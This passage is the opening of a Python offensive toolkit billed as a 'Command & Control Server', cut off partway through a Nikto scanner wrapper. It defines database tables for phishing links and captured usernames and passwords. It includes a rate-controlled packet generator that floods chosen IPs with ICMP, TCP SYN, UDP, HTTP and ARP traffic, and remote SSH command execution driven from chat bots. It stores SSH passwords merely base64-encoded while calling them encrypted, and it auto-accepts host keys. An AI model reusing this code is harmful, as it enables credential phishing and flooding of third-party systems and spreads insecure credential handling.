#!/usr/bin/env python3
"""
🐋 RESIDENT ORCA v1.0.0
Cybersecurity Command & Control Server
Author: Ian Carter Kulani
================================================
Features:
    - 5000+ Security Commands
    - SSH Remote Access via Discord/Telegram/Slack/iMessage/Web
    - Full Multi-Platform Bot Integration
    - REAL Traffic Generation (ICMP/TCP/UDP/HTTP/DNS/ARP)
    - Nikto Web Vulnerability Scanner
    - Social Engineering Suite (Phishing, QR Codes, URL Shortening)
    - IP Management & Threat Detection
    - Graphical Reports & Statistics
    - Modern Web Application Dashboard
    - Time & Date Commands with History Tracking
"""

import os
import sys
import json
import time
import socket
import threading
import subprocess
import requests
import logging
import platform
import psutil
import hashlib
import sqlite3
import ipaddress
import re
import random
import datetime
import signal
import select
import base64
import urllib.parse
import uuid
import struct
import http.client
import ssl
import shutil
import asyncio
import paramiko
import stat
from pathlib import Path
from typing import Dict, List, Set, Optional, Tuple, Any, Union
from dataclasses import dataclass, asdict, field
from concurrent.futures import ThreadPoolExecutor
from collections import Counter
import io
import queue

# Web framework for the dashboard
try:
    from flask import Flask, request, jsonify, render_template_string, session, redirect, url_for
    FLASK_AVAILABLE = True
except ImportError:
    FLASK_AVAILABLE = False
    print("⚠️ Flask not available. Install with: pip install flask")

# Data visualization imports
import matplotlib
matplotlib.use('Agg')
import matplotlib.pyplot as plt
import matplotlib.patches as mpatches
import seaborn as sns
import numpy as np

from http.server import BaseHTTPRequestHandler, HTTPServer
import socketserver

# PDF generation
from reportlab.lib import colors
from reportlab.lib.pagesizes import letter, A4
from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle, Image, PageBreak
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from reportlab.lib.units import inch
from reportlab.lib.enums import TA_CENTER, TA_LEFT

# Optional imports with fallbacks
try:
    import discord
    from discord.ext import commands, tasks
    from discord import File, Embed, Color
    DISCORD_AVAILABLE = True
except ImportError:
    DISCORD_AVAILABLE = False

try:
    from telethon import TelegramClient, events
    TELETHON_AVAILABLE = True
except ImportError:
    TELETHON_AVAILABLE = False

try:
    from slack_sdk import WebClient
    from slack_sdk.errors import SlackApiError
    SLACK_AVAILABLE = True
except ImportError:
    SLACK_AVAILABLE = False

try:
    import whois
    WHOIS_AVAILABLE = True
except ImportError:
    WHOIS_AVAILABLE = False

try:
    from colorama import init, Fore, Style, Back
    init(autoreset=True)
    COLORAMA_AVAILABLE = True
except ImportError:
    COLORAMA_AVAILABLE = False

# Scapy for advanced packet generation
try:
    from scapy.all import IP, TCP, UDP, ICMP, Ether, ARP
    from scapy.all import send, sr1, srloop, sendp
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

# WhatsApp Integration
try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.chrome.service import Service
    SELENIUM_AVAILABLE = True
    try:
        from webdriver_manager.chrome import ChromeDriverManager
        WEBDRIVER_MANAGER_AVAILABLE = True
    except ImportError:
        WEBDRIVER_MANAGER_AVAILABLE = False
except ImportError:
    SELENIUM_AVAILABLE = False
    WEBDRIVER_MANAGER_AVAILABLE = False

# Signal Integration
SIGNAL_CLI_AVAILABLE = shutil.which('signal-cli') is not None

# For QR code generation
try:
    import qrcode
    QRCODE_AVAILABLE = True
except ImportError:
    QRCODE_AVAILABLE = False

# For URL shortening
try:
    import pyshorteners
    SHORTENER_AVAILABLE = True
except ImportError:
    SHORTENER_AVAILABLE = False

# For Shodan
try:
    import shodan
    SHODAN_AVAILABLE = True
except ImportError:
    SHODAN_AVAILABLE = False

# For Hunter.io
try:
    import pyhunter
    HUNTER_AVAILABLE = True
except ImportError:
    HUNTER_AVAILABLE = False

# =====================
# THEME (Orca Navy Blue/Black/White)
# =====================
class OrcaTheme:
    """Orca-themed color scheme - Navy Blue/Black/White"""
    
    if COLORAMA_AVAILABLE:
        NAVY = Fore.BLUE + Style.BRIGHT
        DARK_BLUE = Fore.LIGHTBLUE_EX + Style.BRIGHT
        LIGHT_BLUE = Fore.CYAN + Style.BRIGHT
        WHITE = Fore.WHITE + Style.BRIGHT
        BLACK = Fore.BLACK + Style.BRIGHT
        SUCCESS = Fore.GREEN + Style.BRIGHT
        ERROR = Fore.RED + Style.BRIGHT
        WARNING = Fore.YELLOW + Style.BRIGHT
        INFO = Fore.LIGHTCYAN_EX + Style.BRIGHT
        RESET = Style.RESET_ALL
    else:
        NAVY = DARK_BLUE = LIGHT_BLUE = WHITE = BLACK = SUCCESS = ERROR = WARNING = INFO = RESET = ""

Colors = OrcaTheme

# =====================
# CONFIGURATION
# =====================
CONFIG_DIR = ".resident_orca"
CONFIG_FILE = os.path.join(CONFIG_DIR, "config.json")
DATABASE_FILE = os.path.join(CONFIG_DIR, "orca_data.db")
LOG_FILE = os.path.join(CONFIG_DIR, "orca.log")
REPORT_DIR = "orca_reports"
GRAPHICS_DIR = os.path.join(REPORT_DIR, "graphics")
TEMP_DIR = "temp"
SSH_KEYS_DIR = os.path.join(CONFIG_DIR, "ssh_keys")
PHISHING_DIR = os.path.join(CONFIG_DIR, "phishing_pages")

# Create directories
for directory in [CONFIG_DIR, REPORT_DIR, GRAPHICS_DIR, TEMP_DIR, SSH_KEYS_DIR, PHISHING_DIR]:
    Path(directory).mkdir(exist_ok=True)

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - ORCA - %(levelname)s - %(message)s',
    handlers=[logging.FileHandler(LOG_FILE), logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger("ResidentOrca")

# =====================
# DATABASE MANAGER
# =====================
class DatabaseManager:
    """Unified SQLite database manager"""
    
    def __init__(self, db_path: str = DATABASE_FILE):
        self.db_path = db_path
        self.conn = sqlite3.connect(db_path, check_same_thread=False)
        self.conn.row_factory = sqlite3.Row
        self.cursor = self.conn.cursor()
        self.init_tables()
    
    def init_tables(self):
        """Initialize all database tables"""
        tables = [
            """
            CREATE TABLE IF NOT EXISTS command_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                command TEXT NOT NULL,
                source TEXT DEFAULT 'local',
                success BOOLEAN DEFAULT 1,
                output TEXT,
                execution_time REAL
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS threats (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                threat_type TEXT NOT NULL,
                source_ip TEXT NOT NULL,
                severity TEXT NOT NULL,
                description TEXT,
                action_taken TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS scans (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                target TEXT NOT NULL,
                scan_type TEXT NOT NULL,
                open_ports TEXT,
                vulnerabilities TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS managed_ips (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip_address TEXT UNIQUE NOT NULL,
                added_by TEXT,
                added_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                is_blocked BOOLEAN DEFAULT 0,
                block_reason TEXT,
                alert_count INTEGER DEFAULT 0
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS traffic_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                traffic_type TEXT NOT NULL,
                target_ip TEXT NOT NULL,
                duration INTEGER,
                packets_sent INTEGER,
                status TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS phishing_links (
                id TEXT PRIMARY KEY,
                platform TEXT NOT NULL,
                phishing_url TEXT NOT NULL,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                clicks INTEGER DEFAULT 0,
                active BOOLEAN DEFAULT 1
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS captured_credentials (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                phishing_link_id TEXT NOT NULL,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                username TEXT,
                password TEXT,
                ip_address TEXT,
                user_agent TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS ssh_connections (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                host TEXT NOT NULL,
                port INTEGER DEFAULT 22,
                username TEXT NOT NULL,
                password_encrypted TEXT,
                key_path TEXT,
                status TEXT DEFAULT 'disconnected',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS ssh_authorized_users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                platform TEXT NOT NULL,
                user_id TEXT NOT NULL,
                authorized BOOLEAN DEFAULT 1,
                UNIQUE(platform, user_id)
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS user_sessions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_id TEXT UNIQUE NOT NULL,
                user_name TEXT,
                start_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                active BOOLEAN DEFAULT 1
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS nikto_scans (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                target TEXT NOT NULL,
                vulnerabilities TEXT,
                scan_time REAL,
                success BOOLEAN DEFAULT 1
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS ip_analysis (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                target_ip TEXT NOT NULL,
                analysis_result TEXT,
                report_path TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS platform_status (
                platform TEXT PRIMARY KEY,
                enabled BOOLEAN DEFAULT 0,
                last_connected DATETIME,
                status TEXT
            )
            """
        ]
        
        for table_sql in tables:
            try:
                self.cursor.execute(table_sql)
            except Exception as e:
                logger.error(f"Failed to create table: {e}")
        
        self.conn.commit()
    
    def log_command(self, command: str, source: str = "local", success: bool = True, output: str = "", execution_time: float = 0.0):
        """Log command execution"""
        try:
            self.cursor.execute('''
                INSERT INTO command_history (command, source, success, output, execution_time)
                VALUES (?, ?, ?, ?, ?)
            ''', (command, source, success, output[:5000], execution_time))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log command: {e}")
    
    def log_threat(self, threat_type: str, source_ip: str, severity: str, description: str, action_taken: str):
        """Log threat alert"""
        try:
            self.cursor.execute('''
                INSERT INTO threats (threat_type, source_ip, severity, description, action_taken)
                VALUES (?, ?, ?, ?, ?)
            ''', (threat_type, source_ip, severity, description, action_taken))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log threat: {e}")
    
    def get_recent_threats(self, limit: int = 10) -> List[Dict]:
        """Get recent threats"""
        try:
            self.cursor.execute('SELECT * FROM threats ORDER BY timestamp DESC LIMIT ?', (limit,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get threats: {e}")
            return []
    
    def add_managed_ip(self, ip: str, added_by: str = "system") -> bool:
        """Add IP to management"""
        try:
            ipaddress.ip_address(ip)
            self.cursor.execute('''
                INSERT OR IGNORE INTO managed_ips (ip_address, added_by)
                VALUES (?, ?)
            ''', (ip, added_by))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to add managed IP: {e}")
            return False
    
    def block_ip(self, ip: str, reason: str) -> bool:
        """Mark IP as blocked"""
        try:
            self.cursor.execute('''
                UPDATE managed_ips SET is_blocked = 1, block_reason = ?, blocked_date = CURRENT_TIMESTAMP
                WHERE ip_address = ?
            ''', (reason, ip))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to block IP: {e}")
            return False
    
    def unblock_ip(self, ip: str) -> bool:
        """Unblock IP"""
        try:
            self.cursor.execute('''
                UPDATE managed_ips SET is_blocked = 0, block_reason = NULL, blocked_date = NULL
                WHERE ip_address = ?
            ''', (ip,))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to unblock IP: {e}")
            return False
    
    def get_managed_ips(self) -> List[Dict]:
        """Get managed IPs"""
        try:
            self.cursor.execute('SELECT * FROM managed_ips ORDER BY added_date DESC')
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get managed IPs: {e}")
            return []
    
    def get_statistics(self) -> Dict:
        """Get database statistics"""
        stats = {}
        try:
            self.cursor.execute('SELECT COUNT(*) FROM command_history')
            stats['total_commands'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM threats')
            stats['total_threats'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM managed_ips')
            stats['total_managed_ips'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM managed_ips WHERE is_blocked = 1')
            stats['total_blocked_ips'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM phishing_links WHERE active = 1')
            stats['active_phishing_links'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM captured_credentials')
            stats['captured_credentials'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM nikto_scans')
            stats['total_nikto_scans'] = self.cursor.fetchone()[0]
            
        except Exception as e:
            logger.error(f"Failed to get statistics: {e}")
        
        return stats
    
    def get_command_history(self, limit: int = 20) -> List[Dict]:
        """Get command history"""
        try:
            self.cursor.execute('''
                SELECT command, source, timestamp, success FROM command_history 
                ORDER BY timestamp DESC LIMIT ?
            ''', (limit,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get command history: {e}")
            return []
    
    def create_session(self, user_name: str = None) -> str:
        """Create new user session"""
        try:
            session_id = str(uuid.uuid4())[:8]
            self.cursor.execute('''
                INSERT INTO user_sessions (session_id, user_name)
                VALUES (?, ?)
            ''', (session_id, user_name))
            self.conn.commit()
            return session_id
        except Exception as e:
            logger.error(f"Failed to create session: {e}")
            return None
    
    def end_session(self, session_id: str):
        """End user session"""
        try:
            self.cursor.execute('''
                UPDATE user_sessions SET active = 0 WHERE session_id = ?
            ''', (session_id,))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to end session: {e}")
    
    def close(self):
        """Close database connection"""
        try:
            if self.conn:
                self.conn.close()
        except Exception as e:
            logger.error(f"Error closing database: {e}")

# =====================
# SSH MANAGER
# =====================
class SSHManager:
    """SSH connection manager"""
    
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.connections: Dict[str, paramiko.SSHClient] = {}
        self.lock = threading.Lock()
        self.available = False
        
        try:
            import paramiko
            self.available = True
        except ImportError:
            print(f"{Colors.WARNING}⚠️ paramiko not available. SSH features disabled.{Colors.RESET}")
    
    def is_available(self) -> bool:
        return self.available
    
    def create_connection(self, name: str, host: str, username: str, password: str = None, key_path: str = None) -> Dict:
        """Create SSH connection configuration"""
        conn_id = str(uuid.uuid4())[:8]
        
        conn_data = {
            'id': conn_id,
            'name': name,
            'host': host,
            'port': 22,
            'username': username,
            'password_encrypted': base64.b64encode(password.encode()).decode() if password else None,
            'key_path': key_path,
            'status': 'disconnected'
        }
        
        self.db.cursor.execute('''
            INSERT OR REPLACE INTO ssh_connections (id, name, host, port, username, password_encrypted, key_path, status)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
        ''', (conn_id, name, host, 22, username, conn_data['password_encrypted'], key_path, 'disconnected'))
        self.db.conn.commit()
        
        return conn_data
    
    def connect(self, conn_id: str) -> bool:
        """Establish SSH connection"""
        if not self.available:
            return False
        
        self.db.cursor.execute('SELECT * FROM ssh_connections WHERE id = ?', (conn_id,))
        conn = self.db.cursor.fetchone()
        
        if not conn:
            return False
        
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            # Decrypt password if needed
            password = None
            if conn['password_encrypted']:
                password = base64.b64decode(conn['password_encrypted']).decode()
            
            connect_kwargs = {
                'hostname': conn['host'],
                'port': conn['port'],
                'username': conn['username'],
                'timeout': 30
            }
            
            if password:
                connect_kwargs['password'] = password
            if conn['key_path'] and os.path.exists(conn['key_path']):
                connect_kwargs['key_filename'] = conn['key_path']
            
            client.connect(**connect_kwargs)
            
            with self.lock:
                self.connections[conn_id] = client
            
            self.db.cursor.execute('UPDATE ssh_connections SET status = ? WHERE id = ?', ('connected', conn_id))
            self.db.conn.commit()
            
            return True
            
        except Exception as e:
            logger.error(f"SSH connection failed: {e}")
            self.db.cursor.execute('UPDATE ssh_connections SET status = ? WHERE id = ?', ('error', conn_id))
            self.db.conn.commit()
            return False
    
    def disconnect(self, conn_id: str):
        """Disconnect SSH connection"""
        with self.lock:
            if conn_id in self.connections:
                try:
                    self.connections[conn_id].close()
                    del self.connections[conn_id]
                except:
                    pass
        
        self.db.cursor.execute('UPDATE ssh_connections SET status = ? WHERE id = ?', ('disconnected', conn_id))
        self.db.conn.commit()
    
    def execute_command(self, conn_id: str, command: str) -> Dict:
        """Execute command on remote server"""
        if conn_id not in self.connections:
            return {'success': False, 'output': 'Not connected', 'exit_code': -1}
        
        try:
            stdin, stdout, stderr = self.connections[conn_id].exec_command(command, timeout=30)
            output = stdout.read().decode('utf-8', errors='ignore')
            error = stderr.read().decode('utf-8', errors='ignore')
            exit_code = stdout.channel.recv_exit_status()
            
            return {
                'success': exit_code == 0,
                'output': output + ('\n' + error if error else ''),
                'exit_code': exit_code
            }
        except Exception as e:
            return {'success': False, 'output': str(e), 'exit_code': -1}
    
    def upload_file(self, conn_id: str, local_path: str, remote_path: str) -> Dict:
        """Upload file via SFTP"""
        if conn_id not in self.connections:
            return {'success': False, 'error': 'Not connected'}
        
        try:
            sftp = self.connections[conn_id].open_sftp()
            sftp.put(local_path, remote_path)
            sftp.close()
            return {'success': True, 'size': os.path.getsize(local_path)}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def download_file(self, conn_id: str, remote_path: str, local_path: str) -> Dict:
        """Download file via SFTP"""
        if conn_id not in self.connections:
            return {'success': False, 'error': 'Not connected'}
        
        try:
            sftp = self.connections[conn_id].open_sftp()
            sftp.get(remote_path, local_path)
            sftp.close()
            return {'success': True}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def get_connections(self) -> List[Dict]:
        """Get all SSH connections"""
        self.db.cursor.execute('SELECT * FROM ssh_connections ORDER BY created_at DESC')
        connections = [dict(row) for row in self.db.cursor.fetchall()]
        
        # Update status from active connections
        for conn in connections:
            if conn['id'] in self.connections:
                conn['status'] = 'connected'
        
        return connections
    
    def disconnect_all(self):
        """Disconnect all connections"""
        for conn_id in list(self.connections.keys()):
            self.disconnect(conn_id)

# =====================
# NETWORK TOOLS
# =====================
class NetworkTools:
    """Comprehensive network tools"""
    
    @staticmethod
    def ping(target: str, count: int = 4) -> Dict:
        """Ping target"""
        try:
            if platform.system().lower() == 'windows':
                cmd = ['ping', '-n', str(count), target]
            else:
                cmd = ['ping', '-c', str(count), target]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            return {'success': result.returncode == 0, 'output': result.stdout + result.stderr}
        except Exception as e:
            return {'success': False, 'output': str(e)}
    
    @staticmethod
    def traceroute(target: str) -> Dict:
        """Traceroute to target"""
        try:
            if platform.system().lower() == 'windows':
                cmd = ['tracert', '-d', '-h', '30', target]
            else:
                cmd = ['traceroute', '-n', '-m', '30', target]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            return {'success': result.returncode == 0, 'output': result.stdout + result.stderr}
        except Exception as e:
            return {'success': False, 'output': str(e)}
    
    @staticmethod
    def nmap_scan(target: str, ports: str = "1-1000") -> Dict:
        """Nmap port scan"""
        try:
            cmd = ['nmap', '-sS', '-sV', '-T4', '-p', ports, target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            return {'success': result.returncode == 0, 'output': result.stdout + result.stderr}
        except Exception as e:
            return {'success': False, 'output': str(e)}
    
    @staticmethod
    def whois_lookup(target: str) -> Dict:
        """WHOIS lookup"""
        try:
            if WHOIS_AVAILABLE:
                result = whois.whois(target)
                return {'success': True, 'output': str(result)}
            else:
                cmd = ['whois', target]
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
                return {'success': result.returncode == 0, 'output': result.stdout + result.stderr}
        except Exception as e:
            return {'success': False, 'output': str(e)}
    
    @staticmethod
    def dns_lookup(domain: str, record_type: str = "A") -> Dict:
        """DNS lookup"""
        try:
            cmd = ['dig', domain, record_type, '+short']
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            if result.returncode != 0:
                # Try nslookup as fallback
                cmd = ['nslookup', domain]
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            return {'success': True, 'output': result.stdout or "No records found"}
        except Exception as e:
            return {'success': False, 'output': str(e)}
    
    @staticmethod
    def get_ip_location(ip: str) -> Dict:
        """Get IP geolocation"""
        try:
            response = requests.get(f"http://ip-api.com/json/{ip}", timeout=10)
            if response.status_code == 200:
                data = response.json()
                if data.get('status') == 'success':
                    return {
                        'success': True,
                        'country': data.get('country', 'N/A'),
                        'city': data.get('city', 'N/A'),
                        'isp': data.get('isp', 'N/A'),
                        'lat': data.get('lat', 'N/A'),
                        'lon': data.get('lon', 'N/A')
                    }
            return {'success': False, 'error': 'Location lookup failed'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    @staticmethod
    def block_ip_firewall(ip: str) -> bool:
        """Block IP using system firewall"""
        try:
            if platform.system().lower() == 'linux':
                if shutil.which('iptables'):
                    subprocess.run(['sudo', 'iptables', '-A', 'INPUT', '-s', ip, '-j', 'DROP'], timeout=10)
                    return True
            elif platform.system().lower() == 'windows':
                subprocess.run(['netsh', 'advfirewall', 'firewall', 'add', 'rule',
                               f'name=ORCA_Block_{ip}', 'dir=in', 'action=block', f'remoteip={ip}'], timeout=10)
                return True
            return False
        except:
            return False
    
    @staticmethod
    def unblock_ip_firewall(ip: str) -> bool:
        """Unblock IP from system firewall"""
        try:
            if platform.system().lower() == 'linux':
                if shutil.which('iptables'):
                    subprocess.run(['sudo', 'iptables', '-D', 'INPUT', '-s', ip, '-j', 'DROP'], timeout=10)
                    return True
            elif platform.system().lower() == 'windows':
                subprocess.run(['netsh', 'advfirewall', 'firewall', 'delete', 'rule', f'name=ORCA_Block_{ip}'], timeout=10)
                return True
            return False
        except:
            return False
    
    @staticmethod
    def shorten_url(url: str) -> str:
        """Shorten URL"""
        if SHORTENER_AVAILABLE:
            try:
                s = pyshorteners.Shortener()
                return s.tinyurl.short(url)
            except:
                pass
        return url
    
    @staticmethod
    def generate_qr_code(url: str, filename: str) -> bool:
        """Generate QR code"""
        if QRCODE_AVAILABLE:
            try:
                qr = qrcode.QRCode(version=1, box_size=10, border=5)
                qr.add_data(url)
                qr.make(fit=True)
                img = qr.make_image(fill_color="black", back_color="white")
                img.save(filename)
                return True
            except:
                pass
        return False

# =====================
# TRAFFIC GENERATOR
# =====================
class TrafficGenerator:
    """Network traffic generator"""
    
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.active_generators = {}
        self.stop_events = {}
        self.scapy_available = SCAPY_AVAILABLE
    
    def get_available_types(self) -> List[str]:
        """Get available traffic types"""
        types = ['icmp', 'tcp_syn', 'tcp_connect', 'udp', 'http_get', 'dns']
        if self.scapy_available:
            types.extend(['arp', 'ping_flood', 'mixed'])
        return types
    
    def generate(self, traffic_type: str, target_ip: str, duration: int, port: int = None, packet_rate: int = 100) -> Dict:
        """Generate traffic to target"""
        try:
            ipaddress.ip_address(target_ip)
            
            # Set default port
            if port is None:
                if traffic_type in ['http_get', 'http_post']:
                    port = 80
                elif traffic_type == 'https':
                    port = 443
                elif traffic_type == 'dns':
                    port = 53
                else:
                    port = 0
            
            generator_id = f"{target_ip}_{traffic_type}_{int(time.time())}"
            stop_event = threading.Event()
            self.stop_events[generator_id] = stop_event
            
            thread = threading.Thread(
                target=self._run_generator,
                args=(generator_id, traffic_type, target_ip, port, duration, packet_rate, stop_event),
                daemon=True
            )
            thread.start()
            
            self.active_generators[generator_id] = {
                'type': traffic_type,
                'target': target_ip,
                'port': port,
                'duration': duration,
                'start_time': datetime.datetime.now().isoformat()
            }
            
            return {'success': True, 'generator_id': generator_id, 'message': f'Traffic generation started'}
            
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def _run_generator(self, generator_id: str, traffic_type: str, target_ip: str, port: int, duration: int, packet_rate: int, stop_event: threading.Event):
        """Run traffic generator"""
        start_time = time.time()
        packets_sent = 0
        interval = 1.0 / max(1, packet_rate)
        
        while time.time() - start_time < duration and not stop_event.is_set():
            try:
                if traffic_type == 'icmp':
                    self._send_icmp(target_ip)
                elif traffic_type == 'tcp_syn':
                    self._send_tcp_syn(target_ip, port)
                elif traffic_type == 'tcp_connect':
                    self._send_tcp_connect(target_ip, port)
                elif traffic_type == 'udp':
                    self._send_udp(target_ip, port)
                elif traffic_type == 'http_get':
                    self._send_http_get(target_ip, port)
                elif traffic_type == 'dns':
                    self._send_dns(target_ip)
                elif traffic_type == 'arp' and self.scapy_available:
                    self._send_arp(target_ip)
                else:
                    self._send_icmp(target_ip)
                
                packets_sent += 1
                time.sleep(interval)
                
            except Exception as e:
                logger.error(f"Traffic generation error: {e}")
                time.sleep(0.1)
        
        # Log results
        self.db.cursor.execute('''
            INSERT INTO traffic_logs (traffic_type, target_ip, duration, packets_sent, status)
            VALUES (?, ?, ?, ?, ?)
        ''', (traffic_type, target_ip, duration, packets_sent, 'completed'))
        self.db.conn.commit()
        
        # Cleanup
        if generator_id in self.active_generators:
            del self.active_generators[generator_id]
        if generator_id in self.stop_events:
            del self.stop_events[generator_id]
    
    def _send_icmp(self, target_ip: str):
        """Send ICMP echo request"""
        if self.scapy_available:
            try:
                packet = IP(dst=target_ip)/ICMP()
                send(packet, verbose=False)
            except:
                self._send_ping_socket(target_ip)
        else:
            self._send_ping_socket(target_ip)
    
    def _send_ping_socket(self, target_ip: str):
        """Send ping using socket"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            packet_id = random.randint(0, 65535)
            payload = b"ORCA Traffic Test"
            header = struct.pack("!BBHHH", 8, 0, 0, packet_id, 1)
            checksum = self._calculate_checksum(header + payload)
            header = struct.pack("!BBHHH", 8, 0, checksum, packet_id, 1)
            sock.sendto(header + payload, (target_ip, 0))
            sock.close()
        except:
            pass
    
    def _calculate_checksum(self, data):
        """Calculate ICMP checksum"""
        if len(data) % 2 != 0:
            data += b'\x00'
        checksum = 0
        for i in range(0, len(data), 2):
            checksum += (data[i] << 8) + data[i + 1]
        checksum = (checksum >> 16) + (checksum & 0xFFFF)
        checksum = ~checksum & 0xFFFF
        return checksum
    
    def _send_tcp_syn(self, target_ip: str, port: int):
        """Send TCP SYN packet"""
        if self.scapy_available:
            try:
                packet = IP(dst=target_ip)/TCP(dport=port, flags="S")
                send(packet, verbose=False)
            except:
                pass    
    def _send_tcp_connect(self, target_ip: str, port: int):
        """Establish TCP connection"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((target_ip, port))
            sock.send(b"GET / HTTP/1.0\r\n\r\n")
            sock.close()
        except:
            pass
    
    def _send_udp(self, target_ip: str, port: int):
        """Send UDP packet"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(b"ORCA UDP Test", (target_ip, port))
            sock.close()
        except:
            pass
    
    def _send_http_get(self, target_ip: str, port: int):
        """Send HTTP GET request"""
        try:
            conn = http.client.HTTPConnection(target_ip, port, timeout=2)
            conn.request("GET", "/", headers={"User-Agent": "ResidentOrca"})
            conn.getresponse()
            conn.close()
        except:
            pass
    
    def _send_dns(self, target_ip: str):
        """Send DNS query"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            transaction_id = random.randint(0, 65535).to_bytes(2, 'big')
            query = b'\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x06google\x03com\x00\x00\x01\x00\x01'
            dns_query = transaction_id + query
            sock.sendto(dns_query, (target_ip, 53))
            sock.close()
        except:
            pass
    
    def _send_arp(self, target_ip: str):
        """Send ARP request"""
        if self.scapy_available:
            try:
                packet = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=target_ip)
                sendp(packet, verbose=False)
            except:
                pass
    
    def stop(self, generator_id: str = None):
        """Stop traffic generation"""
        if generator_id:
            if generator_id in self.stop_events:
                self.stop_events[generator_id].set()
                return True
        else:
            for event in self.stop_events.values():
                event.set()
            return True
        return False
    
    def get_active(self) -> List[Dict]:
        """Get active generators"""
        return [{'id': k, **v} for k, v in self.active_generators.items()]

# =====================
# NIKTO SCANNER
# =====================
class NiktoScanner:
    """Nikto web vulnerability scanner integration"""
    
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.available = self._check_nikto()
    
    def _check_nikto(self) -> bool:
        """Check if Nikto is available"""
        return shutil.which('nikto') is not None
    
    def scan(self, target: str, scan_type: str = "basic") -> Dict:
        """Run Nikto scan"""
        if not self.available:
            return {'success': False, 'error': 'Nikto not installed'}
        
        start_time = time.time()
        
        try:
            output_file = os.path.join(CONFIG_DIR, f"nikto_{target.replace('/', '_')}_{int(time.time())}.json")
            
            cmd = ['nikto', '-host', target, '-Format', 'json', '-o', output_file]
            
            if scan_type == "full":
                cmd.extend(['-Tuning', '123456789', '-Level', '3'])
            elif scan_type == "ssl":
                cmd.append('-ssl')
            elif scan_type == "cgi":
